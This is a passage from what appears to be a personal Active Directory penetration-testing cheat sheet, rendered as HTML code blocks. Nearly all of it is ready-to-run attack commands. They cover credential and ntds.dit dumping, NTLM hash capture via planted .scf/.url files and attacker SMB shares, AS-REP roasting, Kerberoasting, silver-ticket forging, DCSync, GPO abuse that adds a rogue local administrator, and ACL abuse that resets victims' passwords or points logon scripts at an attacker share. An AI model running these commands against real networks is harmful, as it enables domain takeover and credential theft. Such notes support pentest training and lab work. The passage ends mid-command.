</span><span id="__span-74-18"><a id="__codelineno-74-18" name="__codelineno-74-18" href="#__codelineno-74-18"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>DC1.scrm.local<span class="w"> </span>-u<span class="w"> </span>sqlsvc<span class="w"> </span>-p<span class="w"> </span>Pegasus60<span class="w"> </span>-k<span class="w"> </span>--get-sid<span class="w">  </span><span class="c1"># to get domain sid</span>
</span><span id="__span-74-19"><a id="__codelineno-74-19" name="__codelineno-74-19" href="#__codelineno-74-19"></a>
</span><span id="__span-74-20"><a id="__codelineno-74-20" name="__codelineno-74-20" href="#__codelineno-74-20"></a><span class="c1"># Bloodhound collection</span>
</span><span id="__span-74-21"><a id="__codelineno-74-21" name="__codelineno-74-21" href="#__codelineno-74-21"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;dc-ip&gt;<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All
</span><span id="__span-74-22"><a id="__codelineno-74-22" name="__codelineno-74-22" href="#__codelineno-74-22"></a>
</span><span id="__span-74-23"><a id="__codelineno-74-23" name="__codelineno-74-23" href="#__codelineno-74-23"></a><span class="c1"># cmd execution</span>
</span><span id="__span-74-24"><a id="__codelineno-74-24" name="__codelineno-74-24" href="#__codelineno-74-24"></a>nxc<span class="w"> </span>winrm<span class="w"> </span>ip<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-X<span class="w"> </span>&lt;cmd&gt;
</span><span id="__span-74-25"><a id="__codelineno-74-25" name="__codelineno-74-25" href="#__codelineno-74-25"></a>
</span><span id="__span-74-26"><a id="__codelineno-74-26" name="__codelineno-74-26" href="#__codelineno-74-26"></a><span class="c1"># sensitive data dumping, if user is admin</span>
</span><span id="__span-74-27"><a id="__codelineno-74-27" name="__codelineno-74-27" href="#__codelineno-74-27"></a>nxc<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--sam
</span><span id="__span-74-28"><a id="__codelineno-74-28" name="__codelineno-74-28" href="#__codelineno-74-28"></a>nxc<span class="w"> </span>smb<span class="w"> </span>ip<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-M<span class="w"> </span>lsassy
</span><span id="__span-74-29"><a id="__codelineno-74-29" name="__codelineno-74-29" href="#__codelineno-74-29"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>UserName<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>-M<span class="w"> </span>ntdsutil<span class="w">  </span><span class="c1"># dumps ntds.dit and SYSTEM and parse these using secretsdump</span>
</span><span id="__span-74-30"><a id="__codelineno-74-30" name="__codelineno-74-30" href="#__codelineno-74-30"></a><span class="c1"># enumerate loggedon-users if you have admin rights on that machine then impersonate as that user</span>
</span><span id="__span-74-31"><a id="__codelineno-74-31" name="__codelineno-74-31" href="#__codelineno-74-31"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>UserNAme<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;PASSWORDHERE&#39;</span><span class="w"> </span>--loggedon-users
</span><span id="__span-74-32"><a id="__codelineno-74-32" name="__codelineno-74-32" href="#__codelineno-74-32"></a>
</span><span id="__span-74-33"><a id="__codelineno-74-33" name="__codelineno-74-33" href="#__codelineno-74-33"></a><span class="c1"># bruteforcing</span>
</span><span id="__span-74-34"><a id="__codelineno-74-34" name="__codelineno-74-34" href="#__codelineno-74-34"></a>crackmapexec/netexec<span class="w"> </span>smb<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="w"> </span>wordlist.txt<span class="w"> </span>-d<span class="w"> </span>corp.co<span class="w"> </span>--continue-on-success
</span><span id="__span-74-35"><a id="__codelineno-74-35" name="__codelineno-74-35" href="#__codelineno-74-35"></a>netexec<span class="w"> </span>rdp<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success<span class="w"> </span>--screenshot<span class="w"> </span>--screentime<span class="w"> </span>&lt;time&gt;<span class="w"> </span><span class="c1"># --nla-screenshot</span>
</span></code></pre></div>
<h3 id="exploitation_1">💥Exploitation</h3>
<p><a href="https://exploit-notes.hdks.org/exploit/windows/active-directory/">AD Pentesting Notes</a>
Check: https://www.netexec.wiki/ for more details</p>
<p>in case of "<code>RB_AP_ERR_SKEW(Clock skew too great)</code>" error synchronize the time of kali with DC using <a href="https://en.wikipedia.org/wiki/Ntpdate"><em>ntpdate</em></a> or <a href="https://en.wikipedia.org/wiki/Rdate"><em>rdate</em></a>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>ntpdate<span class="w"> </span>&lt;dcip&gt;
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>rdate<span class="w"> </span>-s<span class="w"> </span>&lt;dcip&gt;
</span></code></pre></div></p>
<h4 id="url-file-attack">URL File Attack</h4>
<p>If you are able to upload a file to an SMB share. In that case, you can try uploading a <code>.scf</code> or <code>.url</code> file to capture the victim's Net-NTLMv2 hash on your attacking machine. After that, you can also attempt client-side attacks by uploading files such as <code>.pdf</code>, <code>.docx</code>, or <code>.odt</code>.
```shell title:file.scf
[Shell]
Command=2
IconFile=\[Listener-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>```shell title:file.url
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>[InternetShortcut]
</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>URL=\\[Listener-IP]\share
</span></code></pre></div></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="c1"># we can also use ntlm_theft tool to create those files</span>
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>python3<span class="w"> </span>ntlm_theft.py<span class="w"> </span>-g<span class="w"> </span>lnk<span class="w"> </span>-s<span class="w"> </span>&lt;attacker_listener_ip&gt;<span class="w"> </span>-f<span class="w"> </span>vault
</span></code></pre></div>
<h4 id="backup-operator">Backup operator</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="c1"># Dumping ntds.dit through remote registry service</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a>impacket-reg<span class="w"> </span>joe:<span class="s1">&#39;Flowers1&#39;</span>@172.16.238.10<span class="w"> </span>backup<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;\\192.attckr.ip\share&#39;</span><span class="w"> </span><span class="c1"># add the share in quotes otherwise error, also try adding domain.com/ in case of error</span>
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a><span class="c1"># Before the above host the smb share on the kali machine</span>
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>.<span class="w"> </span>-smb2support
</span></code></pre></div>
<h4 id="as-rep-roasting">AS-REP Roasting</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>impacket-GetNPUsers<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.50.70<span class="w">  </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>hashes.asreproast<span class="w"> </span>corp.com/pete
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>hashes.asreproast<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a>impacket-GetNPUsers<span class="w"> </span><span class="s2">&quot;&lt;domain&gt;/&quot;</span><span class="w"> </span>-usersfile<span class="w"> </span>&lt;userlist.txt&gt;<span class="w"> </span>-request<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>ASREProastables.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC01_IP</span>
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a><span class="c1"># We can use [_Rubeus_](https://github.com/GhostPack/Rubeus), which is a toolset for raw Kerberos interactions and abuses.</span>
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>asreproast<span class="w"> </span>/nowrap
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a><span class="c1"># In case we have the GenericAll perms on another user, instead of changing passwrod we can disable preauth to capture its hash</span>
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a>bloodyAD<span class="w"> </span>--host<span class="w"> </span>DC_host<span class="w"> </span>--dc-ip<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;DOMAIN&gt;<span class="w"> </span>-u<span class="w"> </span>attacker<span class="w"> </span>-p<span class="w"> </span>PASS<span class="w"> </span>add<span class="w"> </span>uac<span class="w"> </span>victimuser<span class="w"> </span>-f<span class="w"> </span>DONT_REQ_PREAUTH<span class="w"> </span><span class="c1"># use &quot;remove uac&quot; to remove</span>
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a><span class="c1"># powerview</span>
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>victimuser<span class="w"> </span>-XOR<span class="w"> </span>@<span class="o">{</span><span class="nv">userAccountControl</span><span class="o">=</span>0x04000000<span class="w"> </span><span class="c1"># again xor to remove</span>
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a><span class="c1">#netexec</span>
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">192</span>.168.0.104<span class="w"> </span>-u<span class="w"> </span>harry<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--asreproast<span class="w"> </span>output.txt<span class="w"> </span><span class="c1"># or use userlist.txt and empty pass</span>
</span></code></pre></div>
<h4 id="kerberoasting">Kerberoasting</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>impacket-GetUserSPNs<span class="w"> </span>hacklab.local/john:Password123<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC01_IP</span><span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerberoastable.hashes
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerberoastable.hashes<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a><span class="c1"># Rubeus</span>
</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a>.<span class="se">\R</span>ubeus.exe<span class="w"> </span>kerberoast<span class="w"> </span>/outfile:hashes.kerberoast
</span><span id="__span-80-5"><a id="__codelineno-80-5" name="__codelineno-80-5" href="#__codelineno-80-5"></a><span class="c1"># In case generic all on user we can also make it kerberoastable</span>
</span><span id="__span-80-6"><a id="__codelineno-80-6" name="__codelineno-80-6" href="#__codelineno-80-6"></a>Set-DomainObject<span class="w"> </span>-Identity<span class="w"> </span>svc-alice<span class="w"> </span>-Add<span class="w"> </span>@<span class="o">{</span><span class="nv">servicePrincipalName</span><span class="o">=</span><span class="s2">&quot;HTTP/fake-service.domain.local&quot;</span><span class="o">}</span><span class="w"> </span><span class="c1"># -Delete to delete</span>
</span><span id="__span-80-7"><a id="__codelineno-80-7" name="__codelineno-80-7" href="#__codelineno-80-7"></a>
</span><span id="__span-80-8"><a id="__codelineno-80-8" name="__codelineno-80-8" href="#__codelineno-80-8"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">192</span>.168.0.104<span class="w"> </span>-u<span class="w"> </span>harry<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--kerberoasting<span class="w"> </span>output.txt
</span></code></pre></div>
<h4 id="silver-ticket">Silver Ticket</h4>
<p>For example, we got the access the mssql service but our original mssql_svc account don't have permission to execute commands then we can forge a high privileged ticket named silver ticket
<div class="language-shell highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="c1"># we can also dump TGS from mimikatz</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>kerberos::list<span class="w"> </span>/export<span class="w">  </span><span class="c1"># to dump tgs to crack svc account pass hash</span>
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>mimikatz<span class="w"> </span><span class="s2">&quot;kerberos::hash /password:PASSWORD1!&quot;</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="c1"># convert pass to ntlm hash</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a><span class="c1"># no need to have high privileges</span>
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>kerberos::golden<span class="w"> </span>/sid:&lt;domain-sid&gt;<span class="w"> </span>/domain:corp.com<span class="w"> </span>/ptt<span class="w"> </span>/target:web04.corp.com<span class="w"> </span>/service:http<span class="w"> </span>/rc4:&lt;service_ntlm_hash&gt;<span class="w"> </span>/user:jeffadmin
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a>misc::cmd
</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>klist<span class="w">  </span><span class="c1"># to see the tickets in the memory</span>
</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#__codelineno-81-9"></a><span class="c1"># Rubeus for forged TGS creation</span>
</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#__codelineno-81-10"></a>rubeus.exe<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>/password:&lt;pass&gt;
</span><span id="__span-81-11"><a id="__codelineno-81-11" name="__codelineno-81-11" href="#__codelineno-81-11"></a>Rubeus.exe<span class="w"> </span>silver<span class="w"> </span>/service:&lt;completeSPN&gt;<span class="w"> </span>/rc4:&lt;nthash&gt;<span class="w"> </span>sid:&lt;domainsid&gt;<span class="w"> </span>/user:&lt;user&gt;<span class="w"> </span>/domain:<span class="w"> </span>/ptt
</span><span id="__span-81-12"><a id="__codelineno-81-12" name="__codelineno-81-12" href="#__codelineno-81-12"></a>
</span><span id="__span-81-13"><a id="__codelineno-81-13" name="__codelineno-81-13" href="#__codelineno-81-13"></a>iwr<span class="w"> </span>-UseDefaultCredentials<span class="w"> </span>http://web04<span class="w"> </span><span class="c1"># to use kerberos forged TGS</span>
</span><span id="__span-81-14"><a id="__codelineno-81-14" name="__codelineno-81-14" href="#__codelineno-81-14"></a>
</span><span id="__span-81-15"><a id="__codelineno-81-15" name="__codelineno-81-15" href="#__codelineno-81-15"></a><span class="c1"># in Kali</span>
</span><span id="__span-81-16"><a id="__codelineno-81-16" name="__codelineno-81-16" href="#__codelineno-81-16"></a>impacket-ticketer<span class="w"> </span>-nthash<span class="w"> </span>&lt;SVC_NTLM&gt;<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;SID&gt;<span class="w"> </span>-domain<span class="w"> </span>corp.com<span class="w"> </span>-spn<span class="w"> </span>&lt;spn&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>ip<span class="w"> </span>Administrator<span class="w"> </span><span class="c1"># target user to get privs of</span>
</span><span id="__span-81-17"><a id="__codelineno-81-17" name="__codelineno-81-17" href="#__codelineno-81-17"></a>curl<span class="w"> </span>--negotiate<span class="w"> </span>-u<span class="w"> </span>:<span class="w"> </span>http://web04.corp.com<span class="w">  </span><span class="c1"># --negotiate automatically shift to kerb auth</span>
</span></code></pre></div></p>
<h4 id="dc-sync-attack">DC Sync Attack</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="c1"># dmping hash of the specific user directly from DC, no need to be available in the memory</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>lsadump::dcsync<span class="w"> </span>/user:corp<span class="se">\d</span>ave<span class="w">  </span><span class="c1"># should have one of the directory replication perms or in one of the Admin groups</span>
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a><span class="c1"># DC sync using secretsdump</span>
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>impacket-secretsdump<span class="w"> </span>-just-dc-user<span class="w"> </span>dave<span class="w"> </span>&lt;highpriv-domuser&gt;:&lt;pass&gt;@192.168.50.70<span class="w"> </span><span class="c1"># it uses [_DRSUAPI_](https://wiki.samba.org/index.php/DRSUAPI) implementing the directory replicaiton service remote protocol </span>
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a><span class="c1"># to check what groups/user has replicating pirvs</span>
</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>dsacls<span class="w"> </span><span class="s2">&quot;dc=corp,dc=com&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>/i<span class="w"> </span>replicat
</span></code></pre></div>
<h4 id="loggedon-user-impersonation">LoggedOn User Impersonation</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="c1"># impersonate any domain user/admin in the machine where we are local admin</span>
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a>query<span class="w"> </span>user<span class="w"> </span><span class="c1"># to query logged on user session</span>
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>schtasks<span class="w"> </span>/create<span class="w"> </span>/tn<span class="w"> </span>ImpersonateDA<span class="w"> </span>/tr<span class="w"> </span><span class="s2">&quot;cmd.exe /c whoami &gt; C:\Temp\impersonated.txt&quot;</span><span class="w"> </span>/sc<span class="w"> </span>ONCE<span class="w"> </span>/st<span class="w"> </span><span class="m">00</span>:00<span class="w"> </span>/RL<span class="w"> </span>HIGHEST<span class="w"> </span>/RU<span class="w"> </span><span class="s2">&quot;CORP\DAusername&quot;</span><span class="w"> </span>/RP<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>/F
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a>
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#__codelineno-83-5"></a><span class="c1"># to test</span>
</span><span id="__span-83-6"><a id="__codelineno-83-6" name="__codelineno-83-6" href="#__codelineno-83-6"></a>schtasks<span class="w"> </span>/run<span class="w"> </span>/tn<span class="w"> </span>ImpersonateDA
</span><span id="__span-83-7"><a id="__codelineno-83-7" name="__codelineno-83-7" href="#__codelineno-83-7"></a><span class="nb">type</span><span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\i</span>mpersonated.txt
</span><span id="__span-83-8"><a id="__codelineno-83-8" name="__codelineno-83-8" href="#__codelineno-83-8"></a>
</span><span id="__span-83-9"><a id="__codelineno-83-9" name="__codelineno-83-9" href="#__codelineno-83-9"></a><span class="c1"># cleanup</span>
</span><span id="__span-83-10"><a id="__codelineno-83-10" name="__codelineno-83-10" href="#__codelineno-83-10"></a>schtasks<span class="w"> </span>/delete<span class="w"> </span>/tn<span class="w"> </span>ImpersonateDA<span class="w"> </span>/f
</span></code></pre></div>
<h4 id="dacl-abuse">DACL Abuse</h4>
<p><a href="https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/acl-abuse">ACL ABUSE LIST</a></p>
<p>Highly Recommended
https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="c1"># If you have GenericWrite on the GPO then create a scheduled task in GroupPolicy using the belwo tool</span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="c1"># directly from kali</span>
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a>python<span class="w"> </span>pygpoabuse.py<span class="w"> </span><span class="s1">&#39;secura.yzx/charlotte:Game2On4.!&#39;</span><span class="w"> </span>-gpo-id<span class="w"> </span><span class="s1">&#39;31B2F340-016D-11D2-945F-00C04FB984F9&#39;</span><span class="w"> </span>-command<span class="w"> </span><span class="s1">&#39;net user synacktiv_pygpoabuse Password123! /add &amp;&amp; net localgroup administrators synacktiv_pygpoabuse /add&#39;</span><span class="w"> </span>-v<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.106.97<span class="w"> </span>
</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a><span class="c1"># [referenced here](https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)</span>
</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a><span class="c1"># gpo id can be checked from bloodhound or powerview</span>
</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a>
</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7" href="#__codelineno-84-7"></a><span class="c1"># We can also add ourselves in Local Administrators group</span>
</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8" href="#__codelineno-84-8"></a>.<span class="se">\S</span>harpGPOAbuse.exe<span class="w"> </span>--AddLocalAdmin<span class="w"> </span>--UserAccount<span class="w"> </span>bob.smith<span class="w"> </span>--GPOName<span class="w"> </span><span class="s2">&quot;Vulnerable GPO&quot;</span>
</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9" href="#__codelineno-84-9"></a>
</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10" href="#__codelineno-84-10"></a><span class="c1"># if have access to windows then</span>
</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11" href="#__codelineno-84-11"></a>gpupdate<span class="w"> </span>/force<span class="w"> </span><span class="c1"># to quickly update the group policy over the network otherwise wait</span>
</span></code></pre></div>
<h5 id="1-genericall-on-a-user-reset-password-full-control"><strong>1. GenericAll on a User – Reset Password (Full Control)</strong></h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="c"># WINDOWS</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="s2">&quot;victimuser&quot;</span> <span class="n">-AccountPassword</span> <span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;NewP@ss123!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="n">net</span> <span class="n">user</span> <span class="n">username</span> <span class="n">newpass</span> <span class="p">/</span><span class="n">domain</span>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a><span class="c"># KALI LINUX</span>
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a><span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="s2">&quot;victimuser&quot;</span> <span class="s2">&quot;NewP@ss123!&quot;</span> <span class="n">-U</span> <span class="s2">&quot;DOMAIN/controlleduser%Password123&quot;</span> <span class="n">-S</span> <span class="p">&lt;</span><span class="n">DC_IP</span><span class="p">&gt;</span>
</span></code></pre></div>
<h5 id="2-genericwrite-on-user-modify-scriptpath-or-spn-kerberoasting"><strong>2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)</strong></h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="c"># WINDOWS COMMAND</span>
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="c"># Method 1: Add SPN to perform Kerberoasting (PowerView)</span>
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">targetuser</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">servicePrincipalName</span><span class="p">=</span><span class="s1">&#39;http/kerberoast&#39;</span><span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$myCred</span>
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a><span class="c"># Method 2: Set scriptPath for logon script abuse (PowerView)</span>
</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">targetuser</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">scriptPath</span><span class="p">=</span><span class="s1">&#39;\\attacker\share\shell.bat&#39;</span><span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$myCred</span>
</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a>
</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a><span class="c"># Method 3: Add SPN manually (Rubeus)</span>
</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">addspn</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">targetuser</span> <span class="p">/</span><span class="n">spn</span><span class="p">:</span><span class="n">http</span><span class="p">/</span><span class="n">kerberoast</span> <span class="p">/</span><span class="n">creduser</span><span class="p">:</span><span class="n">controlleduser</span> <span class="p">/</span><span class="n">credpassword</span><span class="p">:</span><span class="n">MyP</span><span class="nv">@ssw0rd</span>
</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a>
</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a><span class="c"># Method 4: Modify SPN via PowerShell</span>
</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;MyP@ssw0rd&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
